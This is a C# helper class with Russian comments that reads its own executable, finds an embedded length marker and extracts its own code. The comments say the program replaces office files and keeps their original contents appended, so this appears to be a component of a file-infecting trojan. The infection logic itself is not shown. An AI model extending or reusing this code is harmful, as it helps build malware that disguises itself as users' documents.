using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Instruments
{
    public class FileOperations
    {
        /// <summary>
        /// Чтение заданного файла
        /// </summary>
        /// <param name="path">Путь файла</param>
        /// <returns>Содержимое файла</returns>
        public static byte[] ReadData(String path)
        {
            try { return File.ReadAllBytes(path); }
            catch { return new byte[] { 0 }; };
        }
        /// <summary>
        /// Дозапись byte-массива к заданному файлу
        /// </summary>
        /// <param name="path">Путь заданного файла</param>
        /// <param name="bytes">byte - массив, который будет дописываться в конец файла </param>
        public static void AppendAllBytes(string path, byte[] bytes)
        {
            //argument-checking here.
            try
            {
                using (var stream = new FileStream(path, FileMode.Append))
                {
                    stream.Write(bytes, 0, bytes.Length);
                }
            }
            catch { }
        }
        /// <summary>
        /// Получение пути текущего исполняемого файла
        /// </summary>
        /// <returns>Пуьб текущего исполняемого файла</returns>
        public static String GetLocationOfCurrentExecutable()
        {
            return System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase.Remove(0, 8);//remove file:///
        }
        /// <summary>
        /// Получение длины исполняемого файла, не включая содержимое файла, который он заменил
        /// (последние 4 байта - длина исполняемого файла)
        /// </summary>
        /// <param name="data">Содержимое исполняемого файла</param>
        /// <returns>Длина исполняемого файла</returns>
        public static int GetSourceCodeLength(byte[] data)
        {
            byte[] exeLenArr = {data[data.Length - 4],
                                data[data.Length - 3],
                                data[data.Length - 2],
                                data[data.Length - 1]};
            return BitConverter.ToInt32(exeLenArr, 0);
        }
        /// <summary>
        /// Получение кода исполняемого файла (то на что заменяется офисный файл)
        /// </summary>
        /// <returns>Код исполняемого файла</returns>
        public static byte[] GetExeData()
        {
            String path = GetLocationOfCurrentExecutable();
            byte[] allData = ReadData(path);
            int exeLen = GetSourceCodeLength(allData);
            return allData.Take(exeLen).ToArray();
        }
        
    }
}
